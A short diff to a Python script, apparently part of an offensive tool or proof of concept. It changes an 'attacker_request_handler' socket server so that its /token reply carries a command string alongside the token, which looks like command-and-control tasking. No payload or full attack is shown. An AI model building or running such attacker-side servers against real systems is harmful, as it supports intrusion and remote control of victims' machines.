@@ -20,6 +20,7 @@ REMOTE_PORT = 443
 @dataclass
 class ClientData:
     token: str
+    commandString: str
 
 
 def attacker_request_handler(conn, addr, client_data):
@@ -39,8 +40,9 @@ def attacker_request_handler(conn, addr, client_data):
         #        break
         total_data += data
         if b"GET /token" in total_data:
-            conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"token\":\"" +
-                         client_data.token.encode() + b"\"}")
+            conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"token\": \"" +
+                         client_data.token.encode() + b"\", \"commandString\": \"" +
+                         client_data.commandString.encode() + b"\"}")
         else:
             conn.sendall(b"HTTP/1.1 404 Not Found\r\n\r\n")
 
